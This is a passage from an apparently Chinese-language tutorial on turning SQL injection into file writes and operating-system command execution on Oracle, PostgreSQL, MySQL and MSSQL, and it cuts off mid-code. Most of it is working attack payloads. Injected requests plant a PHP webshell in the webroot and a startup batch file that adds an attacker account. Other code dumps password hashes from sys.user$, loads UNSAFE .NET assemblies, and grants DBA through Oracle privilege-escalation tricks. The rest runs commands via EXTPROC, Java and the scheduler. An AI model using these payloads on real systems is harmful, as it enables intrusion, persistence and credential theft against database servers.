title="Oracle"></a>Oracle</h5><p>Oracle中多种创建文件的方法</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">UTL_FILEDBMS_ADVISORDBMS_XSLPROCESSORDBMS_XMLDOM外部表Java操作系统命令和重定向<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自Oracle 9i以来，utl_file可以在文件系统上写二进制代码。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#在数据库服务器的C:驱动器或恰当的UNIX路径中创建了一个二进制文件hello.com：</span><span class="token keyword">Create</span> <span class="token operator">or</span> <span class="token keyword">replace</span> directory EXT <span class="token keyword">AS</span> <span class="token string">'C:\';DECLARE fi UTL_FILE.FILE_TYPE;bu RAW(32767);BEGINbu:=hextoraw(1BF3B01BB8100021E8000B88200882780FB81750288D850E8060083C402CD20C35589E5B80100508D451A50B80F00508D5D00FFD383C40689EC5DC3558BEC8B5E088B4E048B5606B80040CD21730231C08BE55DC39048656C6C6F2C20576F726C64210D0A'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fi:<span class="token operator">=</span>UTL_FILE<span class="token punctuation">.</span>fopen<span class="token punctuation">(</span><span class="token string">'EXT'</span><span class="token punctuation">,</span><span class="token string">'hello.com'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span><span class="token number">32767</span><span class="token punctuation">)</span><span class="token punctuation">;</span>UTL_FILE<span class="token punctuation">.</span>put_raw<span class="token punctuation">(</span>fi<span class="token punctuation">,</span>bu<span class="token punctuation">,</span><span class="token boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>UTL_FILE<span class="token punctuation">.</span>fclose<span class="token punctuation">(</span>fi<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>DBMS_ADVISOR可能是创建文件的最快捷方法</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> directory EXT <span class="token keyword">as</span> <span class="token string">'C:\';exec SYS.DBMS_ADVISOR.CREATE_FILE('</span><span class="token keyword">first</span> <span class="token keyword">row</span><span class="token string">', '</span>EXT<span class="token string">','</span>victim<span class="token punctuation">.</span>txt'<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>自Oracle 10g以来，可以使用外部表创建一个包含用户名和口令的文件</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> directory EXT <span class="token keyword">as</span> <span class="token string">'C:\';CREATE TABLE ext_write (myline)ORGANIZATION EXTERNAL(TYPE oracle_datapumpDEFAULT DIRECTORY EXTLOCATION ('</span>victim3<span class="token punctuation">.</span>txt<span class="token string">'))PARALLELASSELECT '</span>I was here<span class="token string">' from dual UNION SELECT name ||'</span><span class="token operator">=</span>'<span class="token operator">||</span>password <span class="token keyword">from</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>DBMS_XSLPROCESSOR可以将XML文件写入文件系统</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> dbms_xslprocessor<span class="token punctuation">.</span>clob2file<span class="token punctuation">(</span>your_xml<span class="token punctuation">,</span><span class="token string">'MYDIR'</span><span class="token punctuation">,</span><span class="token string">'outfile.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>另外还可以通过DBMS_XMLDOM访问文统：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> DIRECTORY XML_DIR <span class="token keyword">AS</span> <span class="token string">'C:\xmlfiles'</span><span class="token punctuation">;</span><span class="token keyword">exec</span> DBMS_XMLDOM<span class="token punctuation">.</span>writeToFile<span class="token punctuation">(</span>doc<span class="token punctuation">,</span><span class="token string">'XML_DIR/outfile.xml'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="PostgreSQL-4"><a href="#PostgreSQL-4" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h5><p>PostgreSQL不但支持使用COPY功能读取文件，还支持使用COPY功能写入文件，它可以将表中的内容以文本格式写入一个文件中(每一行文本表示表中的一行数据)。文件将按照运行PostgreSQL进程(通常是postgres用户)的用户来创建，因此该用户需要对文件所在的路径具有写入权限。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#假定底层数据库用户具有所要求的“超级用户”权限,创建一个临时表</span>http:<span class="token comment">//10.10.10.128/test.php?id=1; create table hack(data text);-- </span><span class="token comment">#在表中插入PHP Webshell代码</span>http:<span class="token comment">//10.10.10.128/test.php?id=1; insert into hack(data) values ("&lt;?php passthru($_GET['cmd']);&gt;");-- </span><span class="token comment">#将表中的数据复制到一个文件中，将该文件放在Web根目录(Webroot)下</span>http:<span class="token comment">//10.10.10.128/test.php?id=1; copy(select data from hack) to '/var/www/shell.php';-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一些能够利用的函数</p><p>lo_create()、lo_export()和lo_unlink()</p><h3 id="执行操作系统命令"><a href="#执行操作系统命令" class="headerlink" title="执行操作系统命令"></a>执行操作系统命令</h3><h4 id="MySQL-2"><a href="#MySQL-2" class="headerlink" title="MySQL"></a>MySQL</h4><p>MySQL服务器和Web服务器位于同一机器上，这样就能使用”select into DUMPFILE”技术在目标机器上构造一个欺骗性的公共网关接口(CGI)</p><p>在WAMP(Windows、Apache、MySQL和PHP)环境中，MySQL常常运行在特权用户权限下，因此攻击者可以在系统的任何位置写入文件。可以根据这一特点采用被动代码执行技术(passive code execution),比如在Administrator的启动文件夹中创建一个批处理文 件。当管理员登录到系统后，攻击者的批处理文件将被执行，并且攻击者的代码将在管理员权 限下执行。</p><p>下面的例子演示了这种攻击：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//vulnsite/vuln.php?name=test' union select 'net user attacker pwd /add' into outfile 'c:\documents and settings\all users\start menu\programs\startup\owned.bat'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Mssql-2"><a href="#Mssql-2" class="headerlink" title="Mssql"></a>Mssql</h4><p>xp_cmdshell的妙用</p><p>现代版本的SQL Server默认禁用了 xp_cmdshell，可以使用sp_configure语句并通过带内信令(signaling)再次打开它。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#通过T-SQL初始化Wscript.Shell实例的方法</span><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> xp_cmdshell3<span class="token punctuation">(</span><span class="token variable">@cmd</span> <span class="token keyword">varchar</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> @ wait <span class="token keyword">int</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">AS</span><span class="token comment">-- </span><span class="token keyword">Create</span> wscript<span class="token punctuation">.</span>Shell object <span class="token keyword">DECLARE</span> <span class="token variable">@result</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token variable">@OLEResult</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token variable">@RunResult</span> <span class="token keyword">int</span> <span class="token keyword">DECLARE</span> <span class="token variable">@ShellID</span> <span class="token keyword">int</span> <span class="token keyword">EXECUTE</span> <span class="token variable">@OLEResult</span> <span class="token operator">=</span> sp_OACreate <span class="token string">'WScript.Shell'</span><span class="token punctuation">,</span> <span class="token variable">@shellID</span> <span class="token keyword">OUT</span> <span class="token keyword">IF</span> <span class="token variable">@OLEResult</span> <span class="token operator">&lt;&gt;</span> <span class="token number">0</span> <span class="token keyword">SELECT</span> <span class="token variable">@result</span> <span class="token operator">=</span> <span class="token variable">@OLEResult</span> <span class="token keyword">IF</span> <span class="token variable">@OLEResult</span> <span class="token operator">&lt;&gt;</span> <span class="token number">0</span> <span class="token keyword">RAISERROR</span><span class="token punctuation">(</span><span class="token string">'CreateObject0X'</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">@OLEResult</span><span class="token punctuation">)</span><span class="token keyword">EXECUTE</span> <span class="token variable">@OLEResult</span> <span class="token operator">=</span> sp_OAMethod <span class="token variable">@ShellID</span><span class="token punctuation">,</span> <span class="token string">'Run'</span><span class="token punctuation">,</span> <span class="token boolean">Null</span><span class="token punctuation">,</span> <span class="token variable">@cmd</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">@wait</span> <span class="token keyword">IF</span> <span class="token variable">@OLEResult</span> <span class="token operator">&lt;&gt;</span> <span class="token number">0</span> <span class="token keyword">SELECT</span> <span class="token variable">@result</span> <span class="token operator">=</span> <span class="token variable">@OLEResult</span> <span class="token keyword">IF</span> <span class="token variable">@OLEResult</span> <span class="token operator">&lt;&gt;</span> <span class="token number">0</span> <span class="token keyword">RAISERROR</span><span class="token punctuation">(</span><span class="token string">'Run8OX'</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">@OLEResult</span><span class="token punctuation">)</span><span class="token comment">--If @OLEResult &lt;&gt; 0 EXEC sp_displayoaerrorinfo @shellID, @OLEResult </span><span class="token keyword">EXECUTE</span> QOLEResult <span class="token operator">=</span> sp_OADestroy <span class="token variable">@ShellID</span> <span class="token keyword">return</span> <span class="token variable">@result</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用CREATE ASSEMBLY指令促使SQL Server从系统中加载文件。如果想使用该功能加载一个有效的.NET二进制文件，有三种选择：</p><ul><li><p>创建并加载本地可执行文件：</p><p>在系统中创建源文件； 将源文件编译为可执行文件； 从 C:\temp\foo.dll 调用 CREATE ASSEMBLY FOO。</p></li><li><p>从UNC共享加载可执行文件：</p><p>在公共访问的Windows共享中创建DLL(或EXE)； 从\public_server\temp\fbo.dll 调用 CREATE ASSEMBLYFOO。</p></li><li><p>从传递的字符串创建可执行文件：</p><ol><li><p>创建可执行文件。</p></li><li><p>将可执行文件分解成HEX：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">File</span><span class="token punctuation">.</span><span class="token keyword">open</span><span class="token punctuation">(</span><span class="token string">"moo.dll"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">"H*"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>"<span class="token number">4</span>d5a90000300000004000000ffff0<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>从 4d5a90000300000004000000ffff0 调用CREATE ASSEMBLY MOO</p></li></ol></li></ul><p>NET提供的信任级别</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SAFE：＞执行计算＞禁止访问外部资源EXTERNAL_ACCESS:＞访问硬盘＞访问环境＞带某些限制的几乎完全的访问UNSAFE：＞等价于完全信任＞调用非托管代码＞以SYSTEM身份做任何事情<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们的目标是以UNSAFE级别加载二进制文件。将数据库设置为“Trustworthy”可以绕开这种限制。</p><p>不受限制地创建一个.NET二进制文件，然后使用设置为UNSAFE的许可将其导入到系统中</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">alter</span> <span class="token keyword">database</span> master <span class="token keyword">set</span> Trustworthy <span class="token keyword">on</span> <span class="token keyword">CREATE</span> ASSEMELY shoe <span class="token keyword">FROM</span> Ox4d5a90<span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">WITH</span> PERMISSION_SET<span class="token operator">=</span>unsafe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Oracle-7"><a href="#Oracle-7" class="headerlink" title="Oracle"></a>Oracle</h4><p>代码的执行通常要求数据库用户具有DBA权限</p><h5 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h5><p>特定的PL/SQL块(比如函数、存储过程、触发器、 视图等)都是在特定的权限之下才能执行</p><p>Oracle带有许多默认的安装包，这些包中包含了大量的对象(表、视 图、函数、过程等等)，SYS具有最高级别的访问权限，在SYS权限下执行SQL语句就能赋予自己DAB角色。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#以一个非特权用户test连接到数据库</span><span class="token comment">#创建一个函数并注入易受攻击的过程</span><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> X <span class="token keyword">return</span> varchar2authid <span class="token keyword">current_user</span> <span class="token keyword">as</span> pragna autononous_transaction<span class="token punctuation">;</span> <span class="token keyword">BEGIN</span> <span class="token keyword">EXECUTE</span> IMMEDIATE <span class="token string">'GRANT DBA TO SCOTT'</span><span class="token punctuation">;</span> <span class="token keyword">COMMIT</span><span class="token punctuation">;</span> <span class="token keyword">RETURN</span> <span class="token keyword">END</span><span class="token punctuation">;</span><span class="token keyword">exec</span> SYS<span class="token punctuation">.</span>LT<span class="token punctuation">.</span>CREATEVORKSPACE<span class="token punctuation">(</span><span class="token string">'zz'' and scott.x&lt;&gt;=''x'</span><span class="token operator">&gt;</span><span class="token punctuation">;</span><span class="token keyword">exec</span> SYS<span class="token punctuation">.</span>LT<span class="token punctuation">.</span>RENOUEWORKSPACE<span class="token punctuation">(</span><span class="token string">'zz'' and scott.x&lt;&gt;=''x'</span><span class="token operator">&gt;</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_role_privs<span class="token punctuation">;</span><span class="token comment">#可以看到SCOTT具有DBA角色</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#具有 CREATE ANY PROCEDURE 和 EXECUTE ANY PROCEDURE 权限的用户可以在SYSTEM模式下创建一个存储过程：</span><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">procedure</span> SYSTEM<span class="token punctuation">.</span>DBATEST<span class="token operator">IS</span><span class="token keyword">BEGIN</span><span class="token keyword">EXECUTE</span> IMMEDIATE <span class="token string">'GRANT DBA TO SCOTT'</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token keyword">EXEC</span> SYSTEM<span class="token punctuation">.</span>DBATEST<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="通过直接访问执行代码"><a href="#通过直接访问执行代码" class="headerlink" title="通过直接访问执行代码"></a>通过直接访问执行代码</h5><p>如果可以直接访问Oracle实例，那么根据Oracle版本的不同，可以使用下列多种不同的方法。</p><p><code>Oracle EXTPROC</code>、<code>Java</code>、<code>DBMS_SCHEDULER</code>是Oracle运行操作系统命令的正式方法。</p><p>使用Oracle数据库中的其他功能来执行操作系统代码，包括<code>PL/SQL native</code>、<code>Oracle Text</code> 、<code>Alter System set 事件</code>、<code>PL/SQL native 9i</code>、<code>Buffer overflow（缓冲区溢出）+ shell代码</code>、<code>Custom code（自定义代码）</code></p><ul><li><p><code>Oracle EXTPROC</code>和<code>Java</code></p><p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql</a></p></li><li><p><code>Oracle EXTPROC</code></p><p>Oracle数据库的PL/SQL程序设计语言可以通过EXTPROC执行外部过程</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#恶意用户首先创建一个共享对象(shared object)—通常是DLL文件或系统库，其中包含了允许执行OS代码的功能：</span><span class="token comment">-- 对于Windows系统</span><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> LIBRARY exec_shell <span class="token keyword">AS</span> <span class="token string">'C:\windows\system32\msvcrt.dll'</span><span class="token punctuation">;</span><span class="token comment">-- 对于UNIX系统</span><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> LIBRARY exec_shell <span class="token keyword">AS</span> <span class="token string">'/lib/libc-2.2.5.so'</span><span class="token punctuation">;</span><span class="token comment">#创建一个过程，调用该库的系统函数：</span><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">procedure</span> oraexec<span class="token punctuation">(</span>cmdstring <span class="token operator">IN</span> <span class="token keyword">CHAR</span><span class="token punctuation">)</span> <span class="token operator">is</span> external NAME <span class="token string">"system"</span>library exec_shell<span class="token keyword">LANGUAGE</span> C<span class="token punctuation">;</span><span class="token comment">#执行该过程：</span><span class="token keyword">exec</span> oraexec<span class="token punctuation">(</span><span class="token string">'net user hacker hack3r /ADD'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#当执行oraexec过程时，数据库指示EXTPROC加载msvcrt.dll或libc库，并执行system()函数。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>通过Java库执行操作系统命令</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#查看用户Java(文件和执行)的许可权限：</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_java_policy <span class="token keyword">where</span> grantee_name <span class="token operator">=</span> <span class="token string">'SCOTT'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>数据库用户具有正确的Java IO许可权限，执行OS代码的方法</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#DBMS_JAVA.RUNJAVA(受影响的系统：11g R1、11g R2)：</span>http:<span class="token comment">//192.168.2.10/ora8.php?name=SCOTT' and (SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c dir&gt;C:\\OUT.LST') FROM DUAL) is not null -- </span><span class="token string">'#DBMS_JAVA_TEST.FUNCALL(受影响的系统：9iR2、10g R2、11g R1、11g R2)：http://192.168.2.10/ora8.php?name=SCOTT'</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">Select</span> DBMS_JAVA_TEST<span class="token punctuation">.</span>FUNCALL<span class="token punctuation">(</span><span class="token string">'oracle/aurora/util/Wrapper '</span><span class="token punctuation">,</span><span class="token string">'main'</span><span class="token punctuation">,</span><span class="token string">'c:\\windows\\system32\\cmd.exe'</span><span class="token punctuation">,</span><span class="token string">'/c'</span><span class="token punctuation">,</span><span class="token string">'dir&gt;c:\\OUT2.LST'</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">)</span> <span class="token operator">is</span> <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># DBMS_JVM_EXP_PERMS允许具有CREATE SESSION权限的用户授予自己Java IO许可权限：</span><span class="token keyword">DECLARE</span> POL DBMS_JVM_EXP_PERMS<span class="token punctuation">.</span>TEMP_JAVA_POLICY<span class="token punctuation">;</span> <span class="token keyword">CURSOR</span> Cl <span class="token operator">IS</span> <span class="token keyword">SELECT</span> <span class="token string">''</span><span class="token keyword">GRANT</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">''</span>SYS<span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FilePermission<span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token operator">&lt;&lt;</span><span class="token keyword">ALL</span> FI LES<span class="token operator">&gt;&gt;</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token keyword">execute</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span>ENABLED<span class="token string">''</span> <span class="token keyword">FROM</span> DUAL<span class="token punctuation">;</span> <span class="token keyword">BEGIN</span> <span class="token keyword">OPEN</span> Cl<span class="token punctuation">;</span> <span class="token keyword">FETCH</span> Cl <span class="token keyword">BULK</span> COLLECT <span class="token keyword">INTO</span> POL<span class="token punctuation">;</span>CLOSECI<span class="token punctuation">;</span>DBMS_JVM_EXP_PERMS<span class="token punctuation">.</span>IMPORT_JVM_PERMS<span class="token punctuation">(</span>POL<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><code>DBMS_SCHEDULER</code></p><p>DBMS_SCHEDULER是Oracle 10g及之后版本中新增的内容，它要求拥有CREATE JOB (10gR1)或 CREATE EXTERNAL JOB(10gR2/11g)权限。自 10.2.0.2 起，不能再以 oracle 用户身 份执行操作系统命令，而要以nobody用户执行：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--Create a Program for dbms_scheduler</span><span class="token keyword">exec</span> DBMS_SCHEDULER<span class="token punctuation">.</span>create_program<span class="token punctuation">(</span><span class="token string">'RDS2009'</span><span class="token punctuation">,</span><span class="token string">'EXECUTABLE'</span><span class="token punctuation">,</span><span class="token string">'c:\WINDOWS\system32\cmd.exe /c echo Owned &gt;&gt; c:\rds3.txt'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--Create, execute, and delete a Job for dbms_scheduler</span><span class="token keyword">exec</span> DBMS_SCHEDULER<span class="token punctuation">.</span>create_job<span class="token punctuation">(</span>job_name <span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">'RDS2009JOB'</span><span class="token punctuation">,</span>program_name <span class="token operator">=</span><span class="token operator">&gt;</span><span class="token string">'RDS2009'</span><span class="token punctuation">,</span>start_date <span class="token operator">=</span><span class="token operator">&gt;</span><span class="token boolean">NULL</span><span class="token punctuation">,</span>repeat_interval <span class="token operator">=</span><span class="token operator">&gt;</span><span class="token boolean">NULL</span><span class="token punctuation">,</span>end_date <span class="token operator">=</span><span class="token operator">&gt;</span><span class="token boolean">NULL</span><span class="token punctuation">,</span>enabled <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token boolean">TRUE</span><span class="token punctuation">,</span>auto_drop <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>PL/SQL native</code></p><p>拥有修改数据库服务器上SPNC_COMMANDS文本文件的权限。如果创建了存储过程、函数或包并启用了 PL/SQL native,那么Oracle会执行该文件中的所有内容。</p><p>下列代码使用PL/SQL native为public授予DBA权限。grant命令是一条通常以SYS用户身份执行的INSERT INTO SYSAUTHS$命令。</p><p>本例中，我们创建了一个名为e2.sql且由sqlplus 执行的文本文件，sqlplus命令可通过PL/SQL native来启动：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> Fl <span class="token keyword">return</span> numberauthid <span class="token keyword">current_user</span> <span class="token keyword">as</span>pragma autonomous_transaction<span class="token punctuation">;</span>v_file UTL_FILE<span class="token punctuation">.</span>FILE_TYPE<span class="token punctuation">;</span><span class="token keyword">BEGIN</span><span class="token keyword">EXECUTE</span> IMMEDIATE q<span class="token string">'!create directory TX as '</span>C:\'<span class="token operator">!</span><span class="token string">';begin-- grant dba to public;DBMS_ADVISOR.CREATE_FILE ('</span><span class="token keyword">insert</span> <span class="token keyword">into</span> sys<span class="token punctuation">.</span>sysauth$ <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token string">'||chr(13)||chr(10)||'</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token string">','</span>TX<span class="token string">','</span>e2<span class="token punctuation">.</span><span class="token keyword">sql</span><span class="token string">');end;EXECUTE IMMEDIATE q'</span><span class="token operator">!</span><span class="token keyword">drop</span> directory TX<span class="token operator">!</span><span class="token string">';EXECUTE IMMEDIATE q'</span><span class="token operator">!</span><span class="token keyword">create</span> directory T <span class="token keyword">as</span> <span class="token string">'C:\ORACLE\ORA101\PLSQL'</span><span class="token operator">!</span><span class="token string">'; utl_file.fremove('</span>T<span class="token string">','</span>spnc_commands<span class="token string">');v_file: = utl_file.fopen ('</span>T<span class="token string">','</span>spnc_commancis<span class="token string">','</span>w<span class="token string">');utl_file.put_line(v_file,'</span>sqlplus <span class="token operator">/</span> <span class="token keyword">as</span> sysdba <span class="token variable">@c</span>:\e2<span class="token punctuation">.</span><span class="token keyword">sql</span><span class="token string">'); utl_file.fclose(v_file);EXECUTE IMMEDIATE q'</span><span class="token operator">!</span><span class="token keyword">drop</span> directory T<span class="token operator">!</span><span class="token string">';EXECUTE IMMEDIATE q'</span><span class="token operator">!</span><span class="token keyword">alter</span> <span class="token keyword">session</span> <span class="token keyword">set</span> plsql_compiler_flags<span class="token operator">=</span><span class="token string">'NATIVE'</span><span class="token operator">!</span><span class="token string">'; EXECUTE IMMEDIATE q'</span><span class="token operator">!</span><span class="token keyword">alter</span> system <span class="token keyword">set</span> plsql_native_library_dir<span class="token operator">=</span><span class="token string">'C:\'!'</span><span class="token punctuation">;</span> <span class="token keyword">EXECUTE</span> IMMEDIATE q<span class="token string">'!create or replace procedure hl as begin null; end;!'</span><span class="token punctuation">;</span><span class="token keyword">COMMIT</span><span class="token punctuation">;</span><span class="token keyword">RETURN</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>Oracle Text</code></p><p>Oracle Text也可以执行操作系统命令。通过用户自定义的过滤器(USER_FILTER_PREF), 可以将表的内容传递给用户自定义的过滤器。在下面的例子中，通过一个表将TCL代码传递 给用户自定义的过滤器。</p><p>使用Oracle Text用户自定义的过滤器存在着一个限制。只能从ORACLE_HOME/bin目录执行。例如，oratclsh.exe就可以执行。对于这一限制，可以使用UTL_FILE包将相应的可执行文件复制到ORACLE_HOME/bin目录，以便执行该文件：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> t <span class="token punctuation">(</span>id number<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">,</span> <span class="token keyword">text</span> varchar2<span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">Begin</span>ctxsys<span class="token punctuation">.</span>ctx_ddl<span class="token punctuation">.</span>drop_preference<span class="token punctuation">(</span><span class="token string">'USER_FILTER_PREF'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token keyword">begin</span>ctxsys<span class="token punctuation">.</span>ctx_ddl<span class="token punctuation">.</span>create_preference<span class="token punctuation">(</span>preference_name <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'USER_FILTER_PREF'</span><span class="token punctuation">,</span>object_name <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token string">'USER_FILTER'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctxsys<span class="token punctuation">.</span>ctx_ddl<span class="token punctuation">.</span>set_attribute<span class="token punctuation">(</span><span class="token string">'USER_FILTER_PREF'</span><span class="token punctuation">,</span><span class="token 